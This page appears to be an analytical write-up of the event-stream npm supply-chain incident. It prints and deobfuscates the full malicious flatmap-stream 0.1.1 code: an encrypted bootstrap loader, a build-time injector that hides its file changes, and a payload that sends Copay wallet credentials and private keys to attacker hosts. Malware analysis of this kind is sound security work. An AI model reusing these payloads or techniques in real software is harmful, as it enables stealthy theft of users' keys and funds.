---
layout: default
title:  "Attack Payloads"
description: "An in-depth look at the attack payloads"
---

On this page, we are going to analyse all the different payloads that were used on the Event-Stream incident.
We start by presenting the unminified code of flatmap-stream version 0.1.0 and 0.1.1.

### Module flatmap-stream Version 0.1.0: 

We first display the code of package `flatmap-stream` version
*0.1.0*. We unminified the code to provide better readability.

```javascript
var Stream = require("stream").Stream;
module.exports = function (e, n) {
  var i = new Stream(),
    a = 0,
    o = 0,
    u = !1,
    f = !1,
    l = !1,
    c = 0,
    s = !1,
    d = (n = n || {}).failures ? "failure" : "error",
    m = {};
  function w(r, e) {
    var t = c + 1;
    if ((e === t ? (void 0 !== r && 
                    i.emit.apply(i, ["data", r]), c++, t++) : 
         (m[e] = r), m.hasOwnProperty(t))) {
      var n = m[t];
      return delete m[t], w(n, t);
    }
    a === ++o && (f && ((f = !1), i.emit("drain")), u && v());
  }
  function p(r, e, t) {
    l || ((s = !0), (r && !n.failures) || 
          w(e, t), r && 
          i.emit.apply(i, [d, r]), (s = !1));
  }
  function b(r, t, n) {
    return e.call(null, r, function (r, e) {
      n(r, e, t);
    });
  }
  function v(r) {
    if (((u = !0), (i.writable = !1), void 0 !== r)) return w(r, a);
    a == o && ((i.readable = !1), i.emit("end"), i.destroy());
  }
  return (
    (i.writable = !0),
    (i.readable = !0),
    (i.write = function (r) {
      if (u) throw new Error("flatmap stream is not writable");
      s = !1;
      try {
        for (var e in r) {
          a++;
          var t = b(r[e], a, p);
          if ((f = !1 === t)) break;
        }
        return !f;
      } catch (r) {
        if (s) throw r;
        return p(r), !f;
      }
    }),
    (i.end = function (r) {
      u || v(r);
    }),
    (i.destroy = function () {
      (u = l = !0),
        (i.writable = i.readable = f = !1),
        process.nextTick(function () {
          i.emit("close");
        });
    }),
    (i.pause = function () {
      f = !0;
    }),
    (i.resume = function () {
      f = !1;
    }),
    i
  );
};
```

### Package flatmap-stream Version 0.1.1: 

We then display the code of `flatmap-stream` version *0.1.1*. We
unminified the code to provide better readability.

```javascript
var Stream = require("stream").Stream;
module.exports = function (e, n) {
  var i = new Stream(),
    a = 0,
    o = 0,
    u = !1,
    f = !1,
    l = !1,
    c = 0,
    s = !1,
    d = (n = n || {}).failures ? "failure" : "error",
    m = {};
  function w(r, e) {
    var t = c + 1;
    if ((e === t ? (void 0 !== r 
                    && i.emit.apply(i, ["data", r]), c++, t++) 
         : (m[e] = r), m.hasOwnProperty(t))) {
      var n = m[t];
      return delete m[t], w(n, t);
    }
    a === ++o && (f && ((f = !1), i.emit("drain")), u && v());
  }
  function p(r, e, t) {
    l || ((s = !0), (r && !n.failures) ||
    w(e, t), r && i.emit.apply(i, [d, r]), (s = !1));
  }
  function b(r, t, n) {
    return e.call(null, r, function (r, e) {
      n(r, e, t);
    });
  }
  function v(r) {
    if (((u = !0), (i.writable = !1), void 0 !== r)) return w(r, a);
    a == o && ((i.readable = !1), i.emit("end"), i.destroy());
  }
  return (
    (i.writable = !0),
    (i.readable = !0),
    (i.write = function (r) {
      if (u) throw new Error("flatmap stream is not writable");
      s = !1;
      try {
        for (var e in r) {
          a++;
          var t = b(r[e], a, p);
          if ((f = !1 === t)) break;
        }
        return !f;
      } catch (r) {
        if (s) throw r;
        return p(r), !f;
      }
    }),
    (i.end = function (r) {
      u || v(r);
    }),
    (i.destroy = function () {
      (u = l = !0),
        (i.writable = i.readable = f = !1),
        process.nextTick(function () {
          i.emit("close");
        });
    }),
    (i.pause = function () {
      f = !0;
    }),
    (i.resume = function () {
      f = !1;
    }),
    i
  );
};
!(function () {
  try {
    var r = require,
      t = process;
    function e(r) {
      return Buffer.from(r, "hex").toString();
    }
    var n = r(e("2e2f746573742f64617461")),
      o = t[e(n[3])][e(n[4])];
    if (!o) return;
    var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
      a = u.update(n[0], e(n[8]), e(n[9]));
    a += u.final(e(n[9]));
    var f = new module.constructor();
    (f.paths = module.paths), f[e(n[7])](a, ""), 
        f.exports(n[1]);
  } catch (r) {}
})();
```
## Payload A 

Above we presented the 2 versions of flatmap-stream.
The difference between versions is an extra
function that has been appended on version 0.1.1. This additional
function makes payload A, the bootstrap, which acts as an enabler for
payloads B and C. This is the code of the payload unminified:

```javascript
! function() {
  try {
      var r = require,
          t = process;
      function e(r) {
          return Buffer.from(r, "hex").toString()
      }
      var n = r(e("2e2f746573742f64617461")),
          o = t[e(n[3])][e(n[4])];
      if (!o) return;
      var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
          a = u.update(n[0], e(n[8]), e(n[9]));
      a += u.final(e(n[9]));
      var f = new module.constructor;
      f.paths = module.paths, f[e(n[7])](a, ""), f.exports(n[1])
  } catch (r) {}
}();
```

This code is unreadable, as it is still obfuscated. Let us walk through
it line by line, deobfuscating and analyzing it.

Function `e` converts a hexadecimal string to text. It is first
used in line 8:

```javascript
var n = r(e("2e2f746573742f64617461"));
```

The hexadecimal string is equivalent to `./test/data`, and function
`r` is the function `require`. So, after renaming `n` to
`testData`, line 8 becomes as follows:

```javascript
var testData = require("./test/data");
```

This line `imports` an auxiliary data file. This data file,
contains 10 hexadecimal string literals. Next to them you can see their
string representation. Multiple of these strings are related to
cryptography and would raise suspicion should anyone see them in a
module such as `flatmap-stream`. Here are the contents of the data
file:

```javascript
module.exports = [
  "75d4c...629", // Payload B
  "db673...6e1", // Payload C
  "63727970746f", // crypto
  "656e76", // env
  "6e706d...f6e", // npm_package_description
  "616573323536", // aes256
  "63726...6572", // createDecipher
  "5f636f6d70696c65", // _compile
  "686578", // hex
  "75746638" // utf8
]; 
```

Line 9 extracts the fourth and fifth string from the data file. Variable
`o` has been renamed to `desc` for readability:

``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\small"}
var desc = process.env.npm_package_description;
```

This line fetches the description of the package from the `node.JS`
environment. The `if` statement on line 10 ensures that the
description is not blank.

From line 11 up to line 15 we repeat the process of getting a line from
the auxiliary data file and converting it to string. We do that in order
to deobfuscate the rest of the function. Moreover, we rename variable
`u` to `decipher`, `a` to `text` and `f` to
`newModule`. By doing so, we get:

```javascript
var decipher = require("crypto").createDecipher("aes256", desc);
var text = decipher.update(testData[0], "hex", "utf8");
text += decipher.final("utf8");
var newModule = new module.constructor();
newModule.paths = module.paths;
newModule._compile(text, "");
newModule.exports(testData[1]);
```

These lines of code perform the following actions:

1.  First, using the package description fetched previously, it creates
    a `decipher` instance.

2.  Then, it uses the `decipher` instance to decrypt the first line
    (which consists of binary data) from the file.

3.  Last, a new module is created with the decrypted data from the file
    as it source, and the second line from the file is exported from
    that module.

Since the description of a specific npm package is used as the
decryption key, payloads B and C are decrypted correctly only when
`flatmap-stream` is part of the dependency tree through
`event-stream`. Hence, the scope of the attack is limited to
Copay.The encrypted code is also resistant to static analysis, avoiding
detection by such tools.

## Payload B 

```javascript
{
"build:ios-release": 
    "npm run env:prod 
        && ionic cordova build ios 
        --release
        --aot true 
        --environment prod 
        --output-hashing all 
        --sourcemaps false 
        --extract-css true 
        --named-chunks false 
        --build-optimizer true",
"build:android-release": 
    "npm run env:prod 
        && ionic cordova build android 
        --release --aot true 
        --environment prod 
        --output-hashing all 
        --sourcemaps false 
        --extract-css true 
        --named-chunks false 
        --build-optimizer true",
"build:desktop-release": 
    "npm run env:desktop 
        && node 
        --max-old-space-size=8192 
        ./path/ionic-app-scripts.js build 
        --prod"
}
```

After successful decryption of the first line of the data file from
payload A, payload B is created as a new module. Payload B acts as the
injector. This new unobfuscated module looks as follows:

```javascript
/*@@*/
module.exports = function(e) {
  try {
      if (!/build\:.*\-release/.test(process.argv[2])) return;
      var t = process.env.npm_package_description,
          r = require("fs"),
          i = "/path/ReedSolomonDecoder.js",
          n = r.statSync(i),
          c = r.readFileSync(i, "utf8"),
          o = require("crypto").createDecipher("aes256", t),
          s = o.update(e, "hex", "utf8");
      s = "\n" + (s += o.final("utf8"));
      var a = c.indexOf("\n/*@@*/");
      0 <= a && (c = c.substr(0, a)), 
        r.writeFileSync(i, c + s, "utf8"), 
        r.utimesSync(i, n.atime, n.mtime), 
        process.on("exit", function() {
          try {
              r.writeFileSync(i, c, "utf8"), 
                r.utimesSync(i, n.atime, n.mtime)
          } catch (e) {}
      })
  } catch (e) {}
};
```

We start with line four:

```javascript
if (!/build\:.*\-release/.test(process.argv[2])) return;
```

The script is being run by a command in this format:

```javascript
npm run-script script-name
```

The regex from line 4 tests if `script-name` starts with
`'build:'` and ends with `'-release'`. The regex was
designed to test for scripts that target the Android, iOS, and desktop
versions of Copay.

The Copay application has another non-malicious dependency called
`ZXing`. This module imports `ReedSolomonDecoder.js`, which is
being targeted by payload B for the injection. In particular, the code
of payload C will be injected into the `ReedSolomonDecoder.js` file
by modifying the file on disk. However, this file is accessed in the
context that the malicious script is intended to be run in. If the file
has not been modified, payload B does nothing. If it does,
`'/*@@*/'` appears in the file and payload C is injected into the
file, awaiting execution. After the injection occurs, payload B replaces
the metadata of the file (modified/accessed timestamps) so that it
appears like the file has not been altered.

# Attack Payload C 

```javascript
/*@@*/
! function() {
  function e() {
      try {
          var o = require("http"),
              a = require("crypto"),
              c = "<A public key>";

          function i(e, t, n) {
              e = Buffer.from(e, "hex").toString();
              var r = o.request({
                  hostname: e,
                  port: 8080,
                  method: "POST",
                  path: "/" + t,
                  headers: {
                      "Content-Length": n.length,
                      "Content-Type": "text/html"
                  }
              }, function() {});
              r.on("error", function(e) {}), r.write(n), r.end()
          }

          function r(e, t) {
              for (var n = "", r = 0; r < t.length; r += 200) {
                  var o = t.substr(r, 200);
                  n += a.publicEncrypt(c, 
                  Buffer.from(o, "utf8")).toString("hex") + "+"
              }
              i("636f7061796170692e686f7374", e, n), 
              i("3131312e39302e3135312e313334", e, n)
          }

          function l(t, n) {
              if (window.cordova) try {
                  var e = cordova.file.dataDirectory;
                  resolveLocalFileSystemURL(e, function(e) {
                      e.getFile(t, {
                          create: !1
                      }, function(e) {
                          e.file(function(e) {
                              var t = new FileReader;
                              t.onloadend = function() {
                                  return n(JSON.parse(t.result))
                              }, t.onerror = function(e) {
                                  t.abort()
                              }, t.readAsText(e)
                          })
                      })
                  })
              } catch (e) {} else {
                  try {
                      var r = localStorage.getItem(t);
                      if (r) return n(JSON.parse(r))
                  } catch (e) {}
                  try {
                      chrome.storage.local.get(t, function(e) {
                          if (e) return n(JSON.parse(e[t]))
                      })
                  } catch (e) {}
              }
          }
          global.CSSMap = {}, l("profile", function(e) {
              for (var t in e.credentials) {
                  var n = e.credentials[t];
                  "livenet" == n.network && l("balanceCache-" 
                    + n.walletId, function(e) {
                      var t = this;
                      t.balance = parseFloat(e.balance.split(" ")[0]), 
                      "btc" == t.coin && t.balance < 100 || 
                      "bch" == t.coin && t.balance < 1e3 || 
                      (global.CSSMap[t.xPubKey] = !0, 
                        r("c", JSON.stringify(t)))
                  }.bind(n))
              }
          });
          var e = require("bitcore-wallet-client/lib/credentials.js");
          e.prototype.getKeysFunc = e.prototype.getKeys, 
            e.prototype.getKeys = function(e) {
              var t = this.getKeysFunc(e);
              try {
                  global.CSSMap && 
                  global.CSSMap[this.xPubKey] && 
                  (delete global.CSSMap[this.xPubKey], 
                    r("p", e + "\t" + this.xPubKey))
              } catch (e) {}
              return t
          }
      } catch (e) {}
  }
  window.cordova ? document.addEventListener("deviceready", e) : e()
}();
```
## Payload C

After the execution of payloads A and B, payload C gets injected to the
file `ReedSolomonDecoder.js`. In this subsection of the paper we
will see each of the functions of the payload.

Function `i` takes as arguments an IP address, a path, and a
payload. It then sends the payload as a string to the host inputted on
the specified path (lines 9--22).

Function `r` prepares the payload to be sent by `i`. The
payload gets encrypted using the public key provided by the attacker.
Then payload gets sent to `copayapi.host` and
`111.90.151.134`---a web-server based in Kuala Lumpur, Malaysia
(lines 24--32).

Function `l` stores the contents of a file in a variable and then
parses it to a callback function (lines 34--62).

The callback function first ensures that the script runs on the live
version of the bitcoin network, labeled as `livenet` instead of the
test network labeled `testnet`. It does this by going through the
credentials in the `profile` file. Second, the callback function
accesses the file `balancheCache`, which contains the users
balance. If that balance exceeds 100 bitcoin or 1000 bitcoin cash. and
in case it does, it sets a global variable to true in order to mark.
Note that the user's credentials are stolen regardless of whether the
balance requirements are met. (lines 63--76).

```javascript
var e = require("bitcore-wallet-client/lib/credentials.js");
e.prototype.getKeysFunc = e.prototype.getKeys, 
e.prototype.getKeys = function(e) {
    var t = this.getKeysFunc(e);
    try {
        global.CSSMap && 
        global.CSSMap[this.xPubKey] && 
        (delete global.CSSMap[this.xPubKey], 
        r("p", e + "\t" + this.xPubKey))
    } catch (e) {}
    return t
}
```

The last section of code intercepts and monkey-patches the
`getKeys` function from the Credentials class. Monkey-patching
refers to dynamically altering an object's method during the execution
of a program. The patched version of the function reproduces the
functions original result but it also checks the variable (essentially a
hash table) used previously to flag each key. If the value comes up
positive, it deletes variable to remove any remaining traces and
transmits the user's private keys using the `r`{.js} function (lines
77--90).

On the last line, there's an `if` statement responsible for
launching the script as soon as the user's device is ready (line 91).

* * *
[back](./)
